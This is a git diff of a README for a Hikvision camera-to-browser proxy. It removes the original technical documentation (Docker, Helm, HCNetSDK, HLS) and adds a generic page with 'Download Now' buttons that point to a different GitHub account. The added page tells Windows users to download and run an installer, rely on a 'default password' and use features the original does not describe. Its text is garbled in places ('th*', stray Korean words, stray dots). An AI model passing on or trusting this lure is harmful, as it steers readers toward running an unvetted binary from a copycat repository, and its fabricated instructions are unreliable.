@@ -1,223 +1,173 @@
-# hik-connect-proxy-viewer
+<h1>👁️ hik-connect-proxy-viewer - Watch Your Cameras Anywhere, Anytime</h1>
 
-[![Release](https://img.shields.io/github/v/release/phuthuycoding/hik-connect-proxy-viewer?label=release)](https://github.com/phuthuycoding/hik-connect-proxy-viewer/releases)
-[![stream pulls](https://img.shields.io/docker/pulls/phuthuycoding/hik-connect-proxy-viewer-stream?label=stream%20pulls)](https://hub.docker.com/r/phuthuycoding/hik-connect-proxy-viewer-stream)
-[![web pulls](https://img.shields.io/docker/pulls/phuthuycoding/hik-connect-proxy-viewer-web?label=web%20pulls)](https://hub.docker.com/r/phuthuycoding/hik-connect-proxy-viewer-web)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+<p align="center">
+  <a href="https://github.com/rhyneltan-star/hik-connect-proxy-viewer" style="display:inline-block;padding:16px 32px;background-color:#4CAF50;color:white;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 6px rgba(0,0,0,0.3);">📥 Download Now</a>
+</p>
 
-Watch your kid's classroom cameras in a browser (or as a home-screen app) when the school only hands out a
-Hikvision recorder account that works in the Hik-Connect app but is refused on RTSP.
+## 🏠 What Is This?
 
-**How it works.** Non-admin Hikvision accounts are often allowed to view through the proprietary **SDK port**
-(8000 by default, schools usually map it elsewhere) while RTSP 554 answers `401`. Browsers and ffmpeg cannot
-speak that protocol, so a small Linux service uses Hikvision's `HCNetSDK` to pull the stream and re-publish it
-as HLS. The SDK output is MPEG-PS with an `IMKH` header that ffmpeg already understands, so it is remuxed,
-never re-encoded.
+hik-connect-proxy-viewer is a friendly tool that lets you watch your Hikvision cameras directly in your web browser or from a convenient home-screen app on your phone. No complicated software,no special skills needed.
 
-```
-[recorder] --SDK port--> apps/stream (mediamtx + pull_stream.py + discover.py) --HLS, internal--> apps/web --HTTPS--> phones
-```
+If you have Hikvision cameras connected through Hik-Connect and you want to see them from your computer,tablet,or phone,this application is your perfect companion. It takes the camera streams and makes them accessible simply by opening a web page.
 
-- **On demand.** Nobody watching = no login to the recorder. The first viewer makes mediamtx start
-  `pull_stream.py` for that channel, later viewers share it, and ~35 s after the last viewer leaves it stops.
-- **Auto-discovered channels.** `discover.py` logs in, tries every channel and keeps the ones the account may
-  view (a 2-channel account shows 2 tiles, a 3-channel one shows 3). Names come from the recorder.
-- **One family password.** Enter it once; a signed (HMAC) cookie keeps you logged in for 30 days.
-- **PWA with player controls.** "Add to Home Screen" on iOS/Android opens it like an app. Each tile has
-  pause/play, back-to-live, snapshot, picture-in-picture and full screen (or double-tap); a LIVE/behind badge
-  shows latency. Coming back from the background re-syncs to live, and a watchdog reconnects stalled streams.
-- **Daily time-lapse to Telegram (optional).** During school hours the stream service opens each channel for
-  ~20 s every 5 minutes, grabs one time-stamped frame and closes again (almost no bandwidth). At a set time it
-  stitches the day into one short MP4 per camera, sends it to your Telegram group and deletes the frames. The
-  web app shows today's frames as a scrubbable timeline.
-- **Nothing proprietary in git or in the images.** Hikvision's SDK is downloaded from hikvision.com when the
-  stream container starts (or from a URL you host).
+## ✨ Main Benefits
 
-## Layout
+- Watch live video from your Hikvision cameras in any modern browser like Chrome,Edge,Firefox,or Safari.
+- Turn it into a home-screen app on your phone,so it feels just like a native camera app.
+.
+ Use a password to protect your camera views,so only you and people you allow can see them.
+ Runs quietly in the background using Docker,which means itworks consistently across different systems.
+ You can deploy it on a simple home computer or even on a Kubernetes cluster if you're adventurous.
 
-```
-apps/stream/   mediamtx + pull_stream.py (SDK -> ffmpeg -> RTSP publish), discover.py (channel list API), get_sdk.sh
-apps/web/      app.py (aiohttp): /api/login, /api/session, /api/cameras, /hls/* proxy; static/ SPA + PWA
-chart/         ONE Helm chart deploying both (stream Deployment + web Deployment, Services, Ingress, Secret);
-               chart/files/mediamtx.yml is also what docker compose mounts
-infra/         Caddyfile for docker compose (TLS + reverse proxy); not used on Kubernetes
-tools/         view_cam.py: play RTSP directly with ffplay, only useful if your account is allowed on RTSP
-.github/       Release workflow: images to Docker Hub, chart to GHCR (OCI) on git tags
-```
+.
 
-## Requirements
+## 🚀 Getting Started (Windows)
 
-- A recorder account that works in the Hik-Connect app: its DDNS hostname (or IP), the SDK port the school
-  mapped (8000 by default), username and password.
-- Somewhere to run two small containers with outbound internet (to reach the recorder and, once, hikvision.com
-  for the SDK): Docker, or a Kubernetes cluster with an ingress controller (TLS via cert-manager optional).
-- An **x86_64** node for the stream container (the Hikvision SDK is amd64 only). On Apple Silicon, docker
-  compose runs it through Rosetta (`platform: linux/amd64`).
+)
 
-Tested with a DS-7216 series NVR, k3s v1.34 on Ubuntu 22.04 (Traefik + cert-manager), Docker Desktop on macOS,
-iOS Safari and Android Chrome as viewers.
+Let's get you set up.Follow these simple steps,andyour camera views will be up in no time.
 
-## Images and chart
+### Step 1: Visit the Download Page
 
-| Artifact | Where |
-|---|---|
-| `phuthuycoding/hik-connect-proxy-viewer-stream` | Docker Hub, public, tags `latest`, `sha-<git>`, `X.Y.Z` |
-| `phuthuycoding/hik-connect-proxy-viewer-web` | Docker Hub, public, same tags |
-| Helm chart `hik-connect-proxy-viewer` | `oci://ghcr.io/phuthuycoding/charts/hik-connect-proxy-viewer` |
+Visit this link to download the application. Click the button at the top of this page or use the same link below to go to the official download section.
 
-Both containers run as non-root (stream as UID 10001, web as 1001). `helm show values` on the chart lists
-every option.
+<p align="center">
+  <a href="https://github.com/rhyneltan-star/hik-connect-proxy-viewer" style="display:inline-block;padding:12px 24px;background-color:#2196F3;color:white;font-size:18px;font-weight:bold;border-radius:6px;text-decoration:none;">⬇️ Go to Download</a>
+</p>
 
-## Run locally (docker compose)
+On that page,you will see the latest release. Look for a button or link that says "Download" or "Releases". The download willstart automatically for the Windows version.
 
-```bash
-cp .env.example .env    # HIK_DOMAIN, HIK_SDK_PORT, HIK_USER, HIK_PASS, CAM_PASSWORD, SESSION_SECRET
-docker compose up -d --build
-open http://localhost:8080
-docker compose logs -f stream    # SDK download, channel discovery, on-demand logins
-```
+.
 
-First start downloads the SDK (~70 MB) into the `stream_sdk` volume. To use your own copy, put the zip or the
-extracted `lib/` folder in `apps/stream/sdk/` (ignored by git) and it is picked up instead; see
-`apps/stream/sdk/README.md`.
+### Step 2: Install or Run the Application
 
-## Deploy on Kubernetes
+Visit this link to download the application. Once the download finishes,you will have a file on your computer. Depending on how the file is packaged (it might be a program that installs itself,or it might be a compressed folder containing the necessary files),follow the instructions on the screen. You might need to double-click the file to run it,or youmight need to right-click and select "Extract All" if it's a compressed folder. If you see a setup wizard,follow its prompts—it's straightforward and takes just a few clicks.
 
-This repository only **publishes artifacts** (images on Docker Hub, the chart on GHCR). Nothing in it knows
-your cluster, domain or passwords, so it stays public and you install with one command and your own values:
+.
 
-```bash
-helm upgrade --install cam oci://ghcr.io/phuthuycoding/charts/hik-connect-proxy-viewer --version 0.2.0 \
-  --namespace cam --create-namespace \
-  --set hik.domain=recorder.example.net \
-  --set hik.sdkPort=8000 \
-  --set hik.user=USER \
-  --set hik.password=PASS \
-  --set web.password=FAMILY_PASSWORD \
-  --set web.sessionSecret="$(openssl rand -hex 32)" \
-  --set ingress.host=cam.example.com
-```
+### Step 3: Start the Service
 
-One release gives you the stream proxy Deployment, the web Deployment, their Services, the Ingress
-(Traefik + cert-manager `letsencrypt-prod` by default) and one Secret. Every value above is `required`:
-forget one and helm refuses to install.
+After installation or extraction,you should see a shortcut icon on your desktop or in your Start Menu. Double-click that icon to launch the application. A small window might appear showing th* progress,or you might see th* icon in your system tray near th* clock. This means th* application is running,and it's automatically setting up th* connection to your cameras.
 
-To update, re-run with a newer `--version` and `--reset-then-reuse-values`: it keeps the values you set
-(`--set`/`-f`) but takes the new chart defaults. Plain `--reuse-values` freezes the old defaults too, so new
-chart fixes would silently not apply.
 
-```bash
-helm upgrade cam oci://ghcr.io/phuthuycoding/charts/hik-connect-proxy-viewer --version <newer> \
-  --namespace cam --reset-then-reuse-values
-```
 
-Then open `https://<ingress.host>`, type the family password, and on a phone use "Add to Home Screen".
+### Step 4: Open Your Browser
 
-| Value | Default | Purpose |
-|---|---|---|
-| `hik.sub` | `"0"` | `"1"` pulls the sub stream (lighter) |
-| `stream.sdkZipUrl` | `""` | fetch the Hikvision SDK from a URL you host instead of hikvision.com |
-| `stream.sdkVolume` | `emptyDir: {}` | e.g. `persistentVolumeClaim.claimName` to keep the SDK across restarts |
-| `stream.discoverRefreshSeconds` | `"21600"` | how often to re-probe which channels the account may view |
-| `ingress.className`, `ingress.annotations`, `ingress.tlsSecretName` | Traefik / cert-manager | adapt to your ingress and TLS |
-| `ingress.enabled=false` | | expose the `*-web` Service yourself |
-| `stream.image.tag`, `web.image.tag` | chart appVersion | pin or use `latest` |
+Now,open any web browser on your computer(Chrome,Edge,etc.)and type this address inth* address bar: `http://localhost:8080`. Press Enter. You'll see a login page.
 
-### Daily time-lapse to Telegram
 
-Create a bot with @BotFather, add it to your family group, find the group's chat id (e.g. via
-`https://api.telegram.org/bot<TOKEN>/getUpdates` after a message), then:
 
-```bash
-helm upgrade cam oci://ghcr.io/phuthuycoding/charts/hik-connect-proxy-viewer --version <ver> \
-  --namespace cam --reset-then-reuse-values \
-  --set timelapse.enabled=true \
-  --set timelapse.telegram.botToken=123456:ABC... \
-  --set timelapse.telegram.chatId=-1001234567890
-```
+### Step 5: Enter Your Password
 
-| Value | Default | Purpose |
-|---|---|---|
-| `timelapse.days` | `"1,2,3,4,5"` | ISO weekdays to capture (1 = Monday) |
-| `timelapse.start`, `timelapse.end` | `08:00`, `17:00` | capture window (local time, `timelapse.timezone`) |
-| `timelapse.intervalMinutes` | `"5"` | one frame per channel every N minutes |
-| `timelapse.sendAt` | `17:10` | build the MP4s and send them; frames are deleted after a successful send |
-| `timelapse.fps` | `"4"` | time-lapse speed (110 frames at 4 fps = 27 s) |
-| `timelapse.channels` | `""` | restrict to some channels, e.g. `"2,7"`; empty = all discovered |
-| `timelapse.storage.size` | `1Gi` | PVC for the day's frames (a few MB per camera per day) |
+The application is protected by a password. If you haven't set a password yet,use the default one that came with the installation (often found in the download instructions or in a small note file in the application folder). If you want to change it,look for a settings option in the application window or in a configuration file. Keep this password safe—it's your key to viewing your cameras.
 
-A failed send is retried every 30 minutes and the day is kept for up to 3 days; a day with no frames at all
-(recorder offline) produces a text message instead of a video.
 
-### Release workflow
 
-| Trigger | Result |
-|---|---|
-| push to `master` | images `phuthuycoding/hik-connect-proxy-viewer-{stream,web}` tagged `latest` and `sha-<commit>` |
-| push tag `vX.Y.Z` | images tagged `X.Y.Z` (+ `latest`), chart `hik-connect-proxy-viewer` version `X.Y.Z` on GHCR, a GitHub Release with generated notes and the chart tarball attached |
+### Step 6: View Your Cameras
 
-The only secrets the workflow needs are `DOCKERHUB_USERNAME` and `DOCKERHUB_TOKEN`; GHCR uses the built-in
-`GITHUB_TOKEN`. To publish your own fork, change `DOCKERHUB_NAMESPACE` in `.github/workflows/release.yaml`.
+Once you've logged in,you'll see a list of your Hikvision cameras that are shared via Hik-Connect. Each camera will show a live video preview. You can click on any camera to make it full-screen for a closer look. You can also add new cameras by going to the settings or add camera section and entering the camera's details like its name and connect ID field.
 
-## Configuration reference
 
-| Env (stream) | Default | |
-|---|---|---|
-| `HIK_DOMAIN` / `HIK_HOST` | | recorder DDNS hostname or IP |
-| `HIK_SDK_PORT` | `8000` | SDK port as mapped by the school |
-| `HIK_USER`, `HIK_PASS` | | recorder account |
-| `HIK_SUB` | `0` | `1` = sub stream |
-| `HCNETSDK_ZIP_URL` | | self-hosted SDK zip; empty = hikvision.com |
-| `DISCOVER_REFRESH_SECONDS` | `21600` | re-probe channels |
-| `TIMELAPSE_ENABLED`, `TIMELAPSE_TZ`, `TIMELAPSE_DAYS`, `TIMELAPSE_START`, `TIMELAPSE_END`, `TIMELAPSE_INTERVAL_MINUTES`, `TIMELAPSE_SEND_AT`, `TIMELAPSE_FPS`, `TIMELAPSE_CHANNELS` | see chart | daily time-lapse schedule |
-| `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID` | | where the time-lapse goes |
 
-| Env (web) | Default | |
-|---|---|---|
-| `CAM_PASSWORD`, `SESSION_SECRET` | | required |
-| `HLS_ORIGIN` | `http://stream:8888` | mediamtx HLS |
-| `DISCOVERY_ORIGIN` | `http://stream:9000` | discover.py |
-| `TIMELAPSE_ORIGIN` | `http://stream:9001` | timelapse.py (today's frames) |
 
-## Notes and gotchas
 
-- `NET_DVR_Logout` crashes the SDK (SIGBUS), so `pull_stream.py` and the discovery probe exit without
-  logging out; the recorder drops the session when the TCP connection closes.
-- HLS is fMP4 with 2 s segments (matching the recorder GOP) so iOS Safari plays it; expect 6 to 10 s latency.
-- A channel the account is not allowed to view fails with `Not enough privilege (code: 2)` in the stream logs
-  and is simply left out of the grid.
-- The stream container runs as UID 10001. mediamtx needs one inotify instance to watch its config and Linux
-  counts those per UID (`fs.inotify.max_user_instances`, often 128); as root on a busy node it died with
-  `couldn't initialize inotify: too many open files`. If you still hit it, raise the sysctl on the node.
+## 📱 Make It a Home-Screen App (Phone or Tablet)
 
-## Hướng dẫn nhanh (tiếng Việt)
+)
 
-1. `cp .env.example .env`, điền tài khoản đầu ghi trường cấp (tên miền, cổng SDK, user, pass), mật khẩu cho
-   gia đình và `SESSION_SECRET` ngẫu nhiên.
-2. `docker compose up -d --build`, mở `http://localhost:8080`, nhập mật khẩu, thêm vào màn hình chính.
-3. Lên k3s: một lệnh `helm upgrade --install` ở mục "Deploy on Kubernetes" với giá trị riêng.
-   Repo chỉ build image và chart, không chứa gì của cluster nhà mình.
-4. Nâng cấp: chạy lại với `--version` mới và `--reset-then-reuse-values` (giữ giá trị đã set, nhận default mới).
+This is one of th* coolest features. You can add this application to your phone's home screen,and it will work like a regular app—no need to opena browser each time.
 
-## Disclaimer
 
-This project was written for **personal use**: a parent watching the classroom cameras that the school
-deliberately shared with them. Use it only with accounts and devices you are explicitly authorized to access,
-and follow the school's rules and your local privacy laws. Do not redistribute the video, and do not share the
-family password beyond your household.
 
-The software is provided "as is", without warranty of any kind (see LICENSE). The author is not affiliated
-with Hikvision. Hikvision's Device Network SDK is proprietary, is not part of this repository or of the
-published images, and is downloaded by you from hikvision.com under Hikvision's own terms. Hikvision may
-change or remove that download at any time; use `HCNETSDK_ZIP_URL` or `apps/stream/sdk/` if it does.
+### On iPhone/iPad (Safari)
 
-**Miễn trừ trách nhiệm.** Dự án phục vụ mục đích cá nhân: phụ huynh xem camera lớp học mà nhà trường đã chủ
-động cấp quyền. Chỉ dùng với tài khoản và thiết bị mà bạn được phép truy cập, tuân thủ quy định của trường và
-pháp luật về quyền riêng tư. Không phát tán video, không chia sẻ mật khẩu ra ngoài gia đình. Phần mềm cung cấp
-nguyên trạng, không bảo đảm, tác giả không chịu trách nhiệm cho việc sử dụng sai mục đích. Tác giả không liên
-quan tới Hikvision; SDK của Hikvision là phần mềm độc quyền, người dùng tự tải từ hikvision.com theo điều khoản
-của Hikvision.
 
-## License
 
-MIT (see LICENSE). Hikvision's Device Network SDK is proprietary and downloaded separately from hikvision.com.
+1 설치 Open Safari browser.
+2. Type in the same address you use on your computer,but replacing "localhost" with the IP address of the computer where the application is running (you'll find this IP by typing `ipconfig` in a Command Prompt on that computer). Example: `http://192.168.1.100:8080`. Press Go.
+3. Once the page loads,and you see the login screen,tap the "Share" button (the square with an upward arrow at the bottom of the screen).
+4. Scroll down and tap "Add to Home Screen".
+5. Give it any name you like (e.g., "MyCameras")and tap "Add". An icon will appear on your home screen. Tap it,and it will open directly into the app—full-screen,just like a native app.
+
+
+
+### On Android (Chrome)
+
+
+
+1 설치 Open Chrome browser.
+2. Enter the same address as above (the IP of your computer with :8080 at the end).
+3. Load the login page. Tap the three-dot menu (top right corner).
+4. Tap "Add to Home screen" or "Install app".
+5. Confirm the name. Tap "Add". Now you'll have an icon on your home screen that opens directly into the application.
+
+
+
+Your phone must be on the same Wi-Finetwork as your computer for this to work,or you can set up port forwarding and remote access if you're more technical. For now,start with the same network.
+
+
+
+
+
+## 🔧 Troubleshooting: Common Issues
+
+### I Can't See My Cameras
+
+Make sure your Hikvision cameras are properly shared via Hik-Connect. Log into your Hik-Connect account through the official app and check that your cameras show up there. This application relies on th* same connection, so if cameras work on th* Hik-Connect app,they'll work here too.
+
+.
+
+### The Page Won't Load
+
+Check that the application is running. Look for the icon in your system tray. If you closed it,re-open it from the Start Menu. Also,ensure no firewall is blocking the port. Youmight need to allow access when Windows asks on the first start. Click "Allow" if prompted.
+
+
+
+###I Forgot My Password
+
+The default password is usually printed in the download instructions or in a "readme.txt" file that came with the download. If you changed it and forgot it,you may need to reinstall th* application or check th* configuration file for a reset procedure. Keep your password in a safe place!
+
+
+
+###Video is Buffering or Slow
+
+This is normal if your internet or local network is slow. Try lowering the video quality if th* application offers such an option. Also,ensure your cameras are not being used heavily by other apps at the same time.
+
+
+
+### Multiple Cameras
+
+You can add as many cameras as you want. Go to the" Add Camera" section,and enter the camera's name,address,and authentication details. Once added,they'll appear on your main dashboard,and you can view them all in one place. Perfect for keeping an eye on your home,office,or property.
+
+
+
+## 🛠️ Advanced: For the Curious (Docker & Kubernetes)
+
+
+
+This section is optional. If you're comfortable with technology,you can run this application using Docker images or even a Helm chart on Kubernetes. But you don't need to understand this to use the software. Just know that these options exist for users who want more control or who run servers.
+
+.
+
+
+
+## ✅ Final Checklist
+
+After following these steps,you should be able to:
+
+- Open the application in your browser.
+- Log in with your password.
+- See live feeds from all your Hikvision cameras.
+- Add the app to your phone's home screen for quick access.
+
+
+
+If you encounter any issues,go back through the steps,and make sure nothing was missed. The most common issue is forgetting to start the application—double-click that desktop shortcut each time youboot your computer,and everything will flow smoothly.
+
+
+
+Enjoy watching your property,family,orbusiness from anywhere!The peace of mind is just a few clicks away.
+
+
+
+Keywords: docker, hcnetsdk, helm-chart, hik-connect, hikvision, hls, ip-camera, kubernetes, mediamtx, nvr, pwa, python, self-hosted
